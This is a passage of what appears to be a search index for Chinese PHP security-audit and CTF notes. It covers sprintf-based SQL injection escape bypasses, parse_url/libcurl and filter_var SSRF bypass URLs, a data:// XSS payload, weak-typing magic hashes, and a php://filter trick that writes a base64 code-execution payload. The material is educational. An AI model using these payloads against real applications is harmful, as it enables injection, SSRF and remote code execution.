\u8fdb\u884cpadding\uff0c\u5bfc\u81f4\u540e\u4e00\u4e2a ' \u9003\u9038\u4e86 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u5c31\u662f ' \u88ab\u8f6c\u4e49\u6210\u4e86 \\' ,\u4f8b\u5982\u8f93\u5165 %'and 1=1# \u8fdb\u5165\uff0c\u5b58\u5728SQL\u8fc7\u6ee4\uff0c ' \u88ab\u8f6c\u6210\u4e86 \\' \u4e8e\u662fsql\u8bed\u53e5\u53d8\u6210\u4e86 select * from user where username = '%\\' and 1=1#'; \u5982\u679c\u8fd9\u4e2a\u8bed\u53e5\u88ab\u4f7f\u7528sprintf\u51fd\u6570\u8fdb\u884c\u4e86\u62fc\u63a5\uff0c % \u540e\u7684 \\ \u88ab\u5403\u6389\u4e86\uff0c\u5bfc\u81f4\u4e86 \u2019 \u9003\u9038 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%\\' and 1=1#';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' ?> \u4e0d\u8fc7\u8fd9\u6837\u5bb9\u6613\u9047\u5230 PHP Warning: sprintf(): Too few arguments \u7684\u62a5\u9519 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 %1$ \u6765\u5403\u6389\u8f6c\u79fb\u6dfb\u52a0\u7684 \\ 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%1 $\\ ' and 1=1#' and password='%s';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' and password='admin'; ?>","title":"sprintf()\u683c\u5f0f\u5316\u6f0f\u6d1e\uff08\u53ef\u4ee5\u5403\u6389\u8f6c\u4e49\u540e\u7684\u5355\u5f15\u53f7"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php-and","text":"$c = is_numeric($a) and is_numeric($b) \u7a0b\u5e8f\u672c\u610f\u662f\u8981a\u3001b\u90fd\u4e3a\u6570\u5b57\u624d\u4f1a\u7ee7\u7eed\uff0c\u4f46\u662f\u5f53a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9c\uff0c\u6240\u4ee5\u53ef\u80fd\u5bfc\u81f4$b\u7ed5\u8fc7\u68c0\u6d4b","title":"php\u4e2d = \u8d4b\u503c\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eand"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#parse_urllibcurlurlssrf","text":"\u5f53url\u4e2d\u6709\u591a\u4e2a@\u7b26\u53f7\u65f6\uff0c parse_url\u4e2d\u83b7\u53d6\u7684host\u662f\u6700\u540e\u4e00\u4e2a@\u7b26\u53f7\u540e\u9762\u7684host\uff0c\u800clibcurl\u5219\u662f\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a@\u7b26\u53f7\u4e4b\u540e\u7684\u3002 \u56e0\u6b64\u5f53\u4ee3\u7801\u5bf9 http://user@eval.com:80@baidu.com \u8fdb\u884c\u89e3\u6790\u65f6\uff0cPHP\u83b7\u53d6\u7684host\u662fbaidu.com\u662f\u5141\u8bb8\u8bbf\u95ee\u7684\u57df\u540d\uff0c\u800c\u6700\u540e\u8c03\u7528libcurl\u8fdb\u884c\u8bf7\u6c42\u65f6\u5219\u662f\u8bf7\u6c42\u7684eval.com\u57df\u540d\uff0c\u53ef\u4ee5\u9020\u6210ssrf\u7ed5\u8fc7 \u6b64\u5916\u5bf9\u4e8e https://evil@baidu.com \u8fd9\u6837\u7684\u57df\u540d\u8fdb\u884c\u89e3\u6790\u65f6,php\u83b7\u53d6\u7684host\u662f evil@baidu.com \uff0c\u4f46\u662flibcurl\u83b7\u53d6\u7684host\u5374\u662fevil.com","title":"parse_url\u4e0elibcurl\u5bf9\u4e0eurl\u7684\u89e3\u6790\u5dee\u5f02\u53ef\u80fd\u5bfc\u81f4ssrf"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#urlfilter_varparse_urlssrf","text":"filter_var()\u51fd\u6570\u5bf9\u4e8e http://evil.com;google.com \u4f1a\u8fd4\u56defalse\u4e5f\u5c31\u662f\u8ba4\u4e3aurl\u683c\u5f0f\u9519\u8bef\uff0c\u4f46\u662f\u5bf9\u4e8e 0://evil.com:80;google.com:80/ \u3001 0://evil.com:80,google.com:80/ \u3001 0://evil.com:80\\google.com:80/ \u5374\u8fd4\u56detrue.","title":"url\u6807\u51c6\u7684\u7075\u6d3b\u6027\u5bfc\u81f4\u7ed5\u8fc7filter_var\u4e0eparse_url\u8fdb\u884cssrf"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#file_get_contentsxss","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php if ( filter_var ( $argv [ 1 ], FILTER_VALIDATE_URL )) { // parse URL $r = parse_url ( $argv [ 1 ]); print_r ( $r ); // check if host ends with google.com if ( preg_match ( '/baidu\\.com$/' , $r [ 'host' ])) { // get page from URL $a = file_get_contents ( $argv [ 1 ]); echo ( $a ); } else { echo \"Error: Host not allowed\" ; } } else { echo \"Error: Invalid URL\" ; } \u867d\u7136\u901a\u8fc7filter_var\u51fd\u6570\u5bf9url\u7684\u683c\u5f0f\u8fdb\u884c\u68c0\u67e5\uff0c\u5e76\u4e14\u4f7f\u7528\u6b63\u5219\u5bf9url\u7684host\u8fdb\u884c\u9650\u5b9a \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= \u9875\u9762\u4f1a\u5c06 <script>alert(1)</script> \u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u5c31\u6709\u53ef\u80fd\u9020\u6210xss","title":"\u901a\u8fc7file_get_contents\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u5e76\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u6709\u53ef\u80fd\u9020\u6210xss"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 md5(\u2018240610708\u2019); // 0e462097431906509019562988736854 md5(\u2018QNKCDZO\u2019); // 0e830400451993494058024219903391 md5(\u2018240610708\u2019) == md5(\u2018QNKCDZO\u2019) md5(\u2018aabg7XSs\u2019) == md5(\u2018aabC9RqS\u2019) sha1(\u2018aaroZmOk\u2019) == sha1(\u2018aaK1STfY\u2019) sha1(\u2018aaO8zKZF\u2019) == sha1(\u2018aa3OFF9m\u2019) \u20180010e2\u2019 == \u20181e3\u2019 \u20180x1234Ab\u2019 == \u20181193131\u2018 \u20180xABCdef\u2019 == \u2018 0xABCdef\u2019 \u5f53\u8f6c\u6362\u4e3aboolean\u65f6\uff0c\u4ee5\u4e0b\u53ea\u88ab\u8ba4\u4e3a\u662fFALSE\uff1aFALSE\u30010\u30010.0\u3001\u201c\u201d\u3001\u201c0\u201d\u3001array()\u3001NULL 1 2 3 PHP 7 \u4ee5\u524d\u7684\u7248\u672c\u91cc\uff0c\u5982\u679c\u5411\u516b\u8fdb\u5236\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u975e\u6cd5\u6570\u5b57\uff08\u5373 8 \u6216 9\uff09\uff0c\u5219\u540e\u9762\u5176\u4f59\u6570\u5b57\u4f1a\u88ab\u5ffd\u7565\u3002var_dump(0123)=var_dump(01239)=83 PHP 7 \u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f Parse Error\u3002 1 2 3 4 5 6 7 \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u503c\u65f6\uff0c\u82e5\u5b57\u7b26\u4e32\u5f00\u5934\u6709\u6570\u5b57\uff0c\u5219\u8f6c\u4e3a\u6570\u5b57\u5e76\u7701\u7565\u540e\u9762\u7684\u975e\u6570\u5b57\u5b57\u7b26\u3002\u82e5\u4e00\u5f00\u5934\u6ca1\u6709\u6570\u5b57\u5219\u8f6c\u6362\u4e3a0 \\$foo = 1 + \u201cbob-1.3e3\u201d; // $foo is integer (1) \\$foo = 1 + \u201cbob3\u201d; // $foo is integer (1) \\$foo = 1 + \u201c10 Small Pigs\u201d; // $foo is integer (11) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u2018\u2019 == 0 == false \u2018123\u2019 == 123 \u2018abc\u2019 == 0 \u2018123a\u2019 == 123 \u20180x01\u2019 == 1 \u20180e123456789\u2019 == \u20180e987654321\u2019 [false] == [0] == [NULL] == [\u2018\u2019] NULL == false == 0\u00bb true == 1","title":"\u5f31\u7c7b\u578b"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc62/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc62 \u00b6 php\u81ea\u8eab\u5728\u89e3\u6790\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u5982\u679c\u53c2\u6570\u540d\u5b57\u4e2d\u5305\u542b\u201d \u201c\u3001\u201d.\u201d\u3001\u201d[\u201c\u8fd9\u51e0\u4e2a\u5b57\u7b26\uff0c\u4f1a\u5c06\u4ed6\u4eec\u8f6c\u6362\u6210\u4e0b\u5212\u7ebf\u3002 \u00b6 \u4f2a\u534f\u8bae php://filter \u00b6 php://input \u548c php://output \u5206\u522b\u4ee3\u8868\u6807\u51c6\u8f93\u5165\u548c\u6807\u51c6\u8f93\u51fa\uff0c php://filter \u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002 \u6211\u4eec\u8fd9\u4e48\u6765\u7406\u89e3: 1 2 3 4 5 php > $fp = fopen('php://output', 'w'); php > var_dump($fp); resource(2) of type (stream) php > fwrite($fp, \"This is a test.\\n\"); This is a test. \u5f88\u660e\u663e\u6211\u4eec\u5411\u6807\u51c6\u8f93\u51fa\u4e2d\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u7684\u6b64\u65f6\u7684\u76ee\u7684\u662f\u5411\u6807\u51c6\u8f93\u51fa\u5199\u4e00\u53e5\u8bdd\u3002 \u5982\u679c\u8981\u8f6c\u6210\u5927\u5199\u5462\uff1f 1 2 3 php > stream_filter_append($fp, 'string.toupper'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. \u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u9700\u8981\u9644\u52a0\u4e00\u4e2a string.toupper \u8fc7\u6ee4\u5668\u5c31\u884c\uff0c\u4e8e\u662f\uff1a 1 2 3 php > $fp=fopen('php://filter/string.toupper/resource=php://output', 'w'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. php://filter/string.toupper/resource=php://output \u770b\u4e0a\u53bb\u5f88\u8d1f\u8d23 \u6211\u4eec\u8981\u5199\u5165\u7684\u76ee\u6807\u662f php://output \u8981\u52a0\u4e00\u4e2a\u8fc7\u6ee4\u5668 string.toupper \u5408\u5728\u4e00\u8d77\u5c31\u662f php://filter \u534f\u8bae ok\u5c31\u8fd9\u4e48\u7b80\u5355 \u770b\u4e00\u9053\u9898 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?> \u7b2c\u4e8c\u884c\u7684 <?php exit;?> \uff0c\u8fd9\u53e5\u8bdd\u5728\u5f00\u5934\u589e\u52a0\u4e86exit\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u5373\u4f7f\u6211\u4eec\u6210\u529f\u5199\u5165\u4e00\u53e5\u8bdd\uff0c\u4e5f\u6267\u884c\u4e0d\u4e86\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u5728\u5b9e\u6218\u4e2d\u5341\u5206\u5e38\u89c1\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u7f13\u5b58\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u7b49\u5730\u65b9\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u6587\u4ef6\uff0c\u90fd\u4f1a\u88ab\u52a0\u4e0a if(!defined(xxx))exit; \u4e4b\u7c7b\u7684\u9650\u5236\uff09\u3002 file_put_contents \u5141\u8bb8\u6211\u4eec\u5411\u4e00\u4e2a\u6587\u4ef6\u5199\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b\u8fc7\u6ee4\u7684\u4e1c\u4e1c\uff1f\u6bd4\u5982: base64 \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u5411 tmp.php \u5199\u5165\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u662fbase64\u4e4b\u540e\u7684\uff0c\u6211\u4eec\u53ea\u9700\u89e3\u7801base64\u5373\u53ef\uff0c\u800c\u8fd9\u65f6 <?php exit;?> \u5c31\u4f1a\u9762\u76ee\u5168\u975e\u4e86 $filename = php://filter/convert.base64-decode/resource=tmp.php \u56e0\u4e3a <?php exit;?> \u4e2d \"<\u3001?\u3001;\u3001>\" \u7b49\u7b26\u53f7\u89e3\u7801\u65f6\u90fd\u4f1a\u88ab\u5ffd\u7565\uff0c\u6240\u4ee5\u547d\u4ee4\u5c31\u53d8\u6210\u4e86\u2192 \u201cphpexit\u201d\u3002\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u7ed5\u8fc7\u4e86\u8fd9\u4e2a\u51fd\u6570\u3002\u4e4b\u540e\u6211\u4eec\u8981\u60f3\u6267\u884c\u6211\u4eec\u6240\u60f3\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u5728phpexit\u8fd9\u4e03\u4e2a\u5b57\u7b26\u540e\u4efb\u610f\u52a0\u4e00\u4e2a\u5b57\u6bcd\uff08\u56e0\u4e3abase64\u662f4\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u89e3\u7801\u7684 1 phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== --->\u4e3a\u4e86\u586b\u5145\u52a0\u4e00\u4e2aa \u535a\u5ba2\u56ed \u79bb\u522b\u6b4c \u4f2a\u534f\u8bae \u5b98\u65b9\u6587\u6863 \u5b98\u65b9\u6587\u6863","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc62"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc62/#2","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc62"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc62/#php","text":"","title":"php\u81ea\u8eab\u5728\u89e3\u6790\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u5982\u679c\u53c2\u6570\u540d\u5b57\u4e2d\u5305\u542b\u201d \u201c\u3001\u201d.\u201d\u3001\u201d[\u201c\u8fd9\u51e0\u4e2a\u5b57\u7b26\uff0c\u4f1a\u5c06\u4ed6\u4eec\u8f6c\u6362\u6210\u4e0b\u5212\u7ebf\u3002"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc62/#phpfilter","text":"php://input \u548c php://output \u5206\u522b\u4ee3\u8868\u6807\u51c6\u8f93\u5165\u548c\u6807\u51c6\u8f93\u51fa\uff0c php://filter \u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002 \u6211\u4eec\u8fd9\u4e48\u6765\u7406\u89e3: 1 2 3 4 5 php > $fp = fopen('php://output', 'w'); php > var_dump($fp); resource(2) of type (stream) php > fwrite($fp, \"This is a test.\\n\"); This is a test. \u5f88\u660e\u663e\u6211\u4eec\u5411\u6807\u51c6\u8f93\u51fa\u4e2d\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u7684\u6b64\u65f6\u7684\u76ee\u7684\u662f\u5411\u6807\u51c6\u8f93\u51fa\u5199\u4e00\u53e5\u8bdd\u3002 \u5982\u679c\u8981\u8f6c\u6210\u5927\u5199\u5462\uff1f 1 2 3 php > stream_filter_append($fp, 'string.toupper'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. \u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u9700\u8981\u9644\u52a0\u4e00\u4e2a string.toupper \u8fc7\u6ee4\u5668\u5c31\u884c\uff0c\u4e8e\u662f\uff1a 1 2 3 php > $fp=fopen('php://filter/string.toupper/resource=php://output', 'w'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. php://filter/string.toupper/resource=php://output \u770b\u4e0a\u53bb\u5f88\u8d1f\u8d23 \u6211\u4eec\u8981\u5199\u5165\u7684\u76ee\u6807\u662f php://output \u8981\u52a0\u4e00\u4e2a\u8fc7\u6ee4\u5668 string.toupper \u5408\u5728\u4e00\u8d77\u5c31\u662f php://filter \u534f\u8bae ok\u5c31\u8fd9\u4e48\u7b80\u5355 \u770b\u4e00\u9053\u9898 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?> \u7b2c\u4e8c\u884c\u7684 <?php exit;?> \uff0c\u8fd9\u53e5\u8bdd\u5728\u5f00\u5934\u589e\u52a0\u4e86exit\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u5373\u4f7f\u6211\u4eec\u6210\u529f\u5199\u5165\u4e00\u53e5\u8bdd\uff0c\u4e5f\u6267\u884c\u4e0d\u4e86\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u5728\u5b9e\u6218\u4e2d\u5341\u5206\u5e38\u89c1\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u7f13\u5b58\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u7b49\u5730\u65b9\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u6587\u4ef6\uff0c\u90fd\u4f1a\u88ab\u52a0\u4e0a if(!defined(xxx))exit; \u4e4b\u7c7b\u7684\u9650\u5236\uff09\u3002 file_put_contents \u5141\u8bb8\u6211\u4eec\u5411\u4e00\u4e2a\u6587\u4ef6\u5199\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b\u8fc7\u6ee4\u7684\u4e1c\u4e1c\uff1f\u6bd4\u5982: base64 \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u5411 tmp.php \u5199\u5165\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u662fbase64\u4e4b\u540e\u7684\uff0c\u6211\u4eec\u53ea\u9700\u89e3\u7801base64\u5373\u53ef\uff0c\u800c\u8fd9\u65f6 <?php exit;?> \u5c31\u4f1a\u9762\u76ee\u5168\u975e\u4e86 $filename = php://filter/convert.base64-decode/resource=tmp.php \u56e0\u4e3a <?php exit;?> \u4e2d \"<\u3001?\u3001;\u3001>\" \u7b49\u7b26\u53f7\u89e3\u7801\u65f6\u90fd\u4f1a\u88ab\u5ffd\u7565\uff0c\u6240\u4ee5\u547d\u4ee4\u5c31\u53d8\u6210\u4e86\u2192 \u201cphpexit\u201d\u3002\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u7ed5\u8fc7\u4e86\u8fd9\u4e2a\u51fd\u6570\u3002\u4e4b\u540e\u6211\u4eec\u8981\u60f3\u6267\u884c\u6211\u4eec\u6240\u60f3\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u5728phpexit\u8fd9\u4e03\u4e2a\u5b57\u7b26\u540e\u4efb\u610f\u52a0\u4e00\u4e2a\u5b57\u6bcd\uff08\u56e0\u4e3abase64\u662f4\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u89e3\u7801\u7684 1 phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== --->\u4e3a\u4e86\u586b\u5145\u52a0\u4e00\u4e2aa \u535a\u5ba2\u56ed \u79bb\u522b\u6b4c \u4f2a\u534f\u8bae \u5b98\u65b9\u6587\u6863 \u5b98\u65b9\u6587\u6863","title":"\u4f2a\u534f\u8baephp://filter"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc63 \u00b6 \u7cfb\u7edf\u53d8\u91cf\uff08\u8d85\u5168\u5c40\u53d8\u91cf\uff09 \u00b6 1 2 3 4 5 6 7 8 9 $GLOBALS // \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf $_POST // \u83b7\u53d6 post \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_GET // \u83b7\u53d6 get \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_COOKIE // \u83b7\u53d6 cookie $_SESSION // \u83b7\u53d6 session $_FILES // \u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6 $_REQUEST // \u83b7\u53d6 $_GET\uff0c$_POST\uff0c$_COOKIE \u4e2d\u7684\u6570\u636e $_ENV // \u73af\u5883\u53d8\u91cf $_SERVER // \u670d\u52a1\u5668\u548c\u6267\u884c\u73af\u5883\u4fe1\u606f $\u5bfc\u81f4\u7684\u53d8\u91cf\u8986\u76d6 \u00b6 1 2 3 4 5 6 7 $a=\"hello\"; // \u5b9a\u4e49\u53ef\u53d8\u53d8\u91cf\u65f6\uff0c\u53ef\u4ee5\u52a0\u4e0a\u5927\u62ec\u53f7 ${$a}=\"world\"; echo ${$a}; echo $$a; // \u5c06\u666e\u901a\u53d8\u91cf\u7684\u503c hello\uff0c\u4f5c\u4e3a\u53ef\u53d8\u53d8\u91cf\u7684\u53d8\u91cf\u540d\uff0c\u5373 $a echo $hello; \u53cc\u5f15\u53f7\u89e3\u6790\u53d8\u91cf\uff0c\u5355\u5f15\u53f7\u4e0d\u89e3\u6790\u53d8\u91cf \u00b6 1 2 3 $str='hello'; echo \"str is $str\"; // \u8fd0\u884c\u7ed3\u679c : str is hello echo 'str is $str'; // \u8fd0\u884c\u7ed3\u679c : str is $str \u672a\u5b9a\u4e49\u53d8\u91cf \u00b6 1 2 3 4 5 6 7 8 9 php > var_dump($a); PHP Notice: Undefined variable: a in php shell code on line 1 NULL php > var_dump($a==0); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump($a+1); PHP Notice: Undefined variable: a in php shell code on line 1 int(1) //\u4e8e\u662f\u53ef\u4ee5\u901a\u8fc7\u672a\u5b9a\u4e49\u53d8\u91cf\u6765\u83b7\u5f97\u6570\u503c \u6587\u4ef6\u64cd\u4f5c\u76f8\u5173 \u00b6 glob \u51fd\u6570 scandir \u51fd\u6570 $_GET \u548c $_POST \u4f20\u5165\u6570\u7ec4 \u00b6 \u5982\u679c GET \u53c2\u6570\u4e2d\u8bbe\u7f6e name[]=a \uff0c\u90a3\u4e48 $_GET['name'] = [a] \uff0cphp \u4f1a\u628a []=a \u5f53\u6210\u6570\u7ec4\u4f20\u5165\uff0c $_GET \u4f1a\u81ea\u52a8\u5bf9\u53c2\u6570\u8c03\u7528 urldecode \u3002 $_POST \u540c\u6837\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u6570\u636e\uff0c user[]=admin \uff0c $_POST['user'] \u5f97\u5230\u7684\u662f ['admin'] \u662f\u4e00\u4e2a\u6570\u7ec4\u3002 strcmp \u548c strcasecmp \u00b6 strcmp \u548c strcasecmp\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 \u7528\u4e8e\u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u503c\u5982\u4e0b\uff1a \u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b \u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 5.2 \u4e2d\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u5148\u8f6c\u6362\u6210string\u7c7b\u578b\u3002 5.3.3 \u4ee5\u540e\uff0c\u5f53\u6bd4\u8f83\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u662f0\u3002 5.5 \u4e2d\u5982\u679c\u53c2\u6570\u4e0d\u662fstring\u7c7b\u578b\uff0c\u76f4\u63a5return\u4e86 \u6570\u7ec4\u8ddf\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f1a\u8fd4\u56de NULL \u00b6 1 2 3 4 5 6 7 php > $array=[1, 2, 3]; php > var_dump(strcmp($array, 'abc')); PHP Warning: strcmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL //\u67d0\u79cd\u7a0b\u5ea6\u5c31\u662f0 php > var_dump(strcasecmp($array, 'abc')); PHP Warning: strcasecmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL parse_url \u00b6 parse_url() \u51fd\u6570\u53ef\u4ee5\u89e3\u6790 URL\uff0c\u8fd4\u56de\u5176\u7ec4\u6210\u90e8\u5206\uff0c\u6b64\u51fd\u6570\u5e76\u4e0d\u610f\u5473\u7740\u7ed9\u5b9a\u7684 URL \u662f\u5408\u6cd5\u7684\uff0c\u5b83\u53ea\u662f\u5c06\u4e0a\u65b9\u5217\u8868\u4e2d\u7684\u5404\u90e8\u5206\u5206\u5f00\u3002parse_url() \u53ef\u63a5\u53d7\u4e0d\u5b8c\u6574\u7684 URL\uff0c\u5e76\u5c3d\u91cf\u5c06\u5176\u89e3\u6790\u6b63\u786e\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff1a 1 2 3 4 5 6 7 8 php > $url = 'http://prontosil.club'; php > var_dump(parse_url($url)); array(2) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(14) \"prontosil.club\" } \u4f46\u662f\u5f53\u4e00\u4e2aurl\u6ca1\u6709\u534f\u8bae\u7684\u65f6\u5019\uff0c\u4f46\u662f\u7ed9\u4e00\u4e2a\u7aef\u53e3url\u7684\u5b57\u7b26\u4e32\u7684\u65f6\u5019parse_url\u5c31\u4f1a\u7206\u9519\u3002\u8fd9\u4e2a\u7ecf\u6d4b\u8bd5\u5728windows\u4e0b\u5e94\u8be5\u662fphp\u7248\u672c\u5168\u901a\u6740\u7684(5.2-7.0)\uff0clinux\u6ca1\u6d4b\u8bd5\u8fc7\u3002 1 2 3 php > $url = '/pupiles.com:80'; php > var_dump(parse_url($url)); bool(false) \u53ea\u8981\u7aef\u53e3\u540e\u9762\u8ddf\u5b57\u6bcd\u8fd8\u662f\u4f1a\u89e3\u6790\uff0c\u6bd4\u5982 1 2 3 4 5 6 php > $url = '/pupiles.com:80a'; php > var_dump(parse_url($url)); array(1) { [\"path\"]=> string(16) \"/pupiles.com:80a\" } \u7aef\u53e3\u89e3\u6790\u9519\u8bef \u00b6 1 2 3 4 5 6 7 8 9 // php5.5\u4ee5\u4e0a\u8fd9\u6837\u7684url\u7528parse_url\u89e3\u6790\u540e\u9884\u6d4b\u7684\u7ed3\u679c\u662f //pupiles.com/about:1234 array(2) { [\"host\"]=> string(11) \"pupiles.com\" [\"path\"]=> string(9) \"/about:1234\" } \u7136\u800c\u5b9e\u9645\u4e0a\uff1a 1 2 3 4 5 6 7 8 9 10 php > $url = 'pupiles.com/about:1234'; php > var_dump(parse_url($url)); array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } \u4f1a\u9ed8\u8ba4\u89e3\u6790\u51fa\u4e00\u4e2aportkey \u8def\u5f84\u89e3\u6790\u9519\u8bef \u00b6 1 2 3 4 5 6 7 8 php > print_r($uri); /upload?/home/binarycloud/ php > print_r(parse_url($uri)); Array ( [path] => /upload [query] => /home/binarycloud/ ) 1 2 3 4 5 6 7 php > $uri = \"//upload?/home/binarycloud/\"; php > print_r(parse_url($uri)); Array ( [host] => upload [query] => /home/binarycloud/ ) \u7aef\u53e3\u6ea2\u51fa \u00b6 \u5728php5.3.13\u7248\u672c\u4ee5\u4e0b\uff0c\u5f53\u8f93\u5165\u5982\u4e0burl 1 http://pupiles:78325 \u6309\u7167\u6b63\u5e38\u6765\u8bf4\u5e94\u8be5\u4f1a\u8fd4\u56defalse\uff0c\u4f46\u662f\u8fd9\u91cc\u4f1a\u8fd4\u56de 1 2 3 4 5 array(3) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(7) \"pupiles\" [\"port\"]=> int(12789) } php=5.5.38\u5982\u4e0b\uff1a 1 2 3 php > $uri = 'http://pupiles:78325'; php > var_dump(parse_url($uri)); bool(false) \u5f31\u7c7b\u578b \u00b6 